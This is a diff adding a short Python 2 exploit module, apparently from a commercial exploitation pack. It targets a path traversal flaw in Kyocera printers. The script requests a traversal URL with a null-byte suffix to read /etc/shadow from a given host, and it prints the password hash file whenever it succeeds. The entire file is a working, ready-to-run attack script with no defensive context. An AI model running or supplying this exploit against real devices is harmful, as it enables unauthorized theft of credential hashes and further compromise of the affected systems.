@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_kyocera_1'
+_vendor_ = 'kyocera'
+_model_  = ['Printer']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/48561'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/wlmeng/../../../../../../../../../../../etc/shadow%%00index.htm' % (host,port)        
+    response = requests.get(url)    
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'root:$' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
